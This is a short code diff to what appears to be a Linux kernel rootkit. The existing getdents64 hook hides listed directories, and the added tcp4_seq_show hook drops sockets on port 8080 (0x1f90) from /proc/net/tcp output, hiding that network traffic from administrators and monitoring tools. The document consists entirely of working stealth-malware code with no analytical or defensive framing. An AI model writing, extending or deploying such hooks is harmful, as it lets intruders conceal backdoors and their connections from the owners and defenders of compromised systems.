@@ -4,6 +4,7 @@ LIST_HEAD(hidden_dirs_list);
 spinlock_t hidden_dirs_lock = __SPIN_LOCK_UNLOCKED(hidden_dirs_lock);
 
 asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
+asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
 asmlinkage int getdents64_hook(const struct pt_regs *regs) {
     int ret;
@@ -105,4 +106,16 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
 
     // New size without directories we do not want...
     return new_size;
+}
+
+asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v)
+{
+    struct sock *sk = v;
+    
+    if (v != SEQ_START_TOKEN) {
+        if (sk->sk_num == 0x1f90)
+            return 0;
+    }
+
+    return __orig_tcp4_seq_show(seq, v);
 }
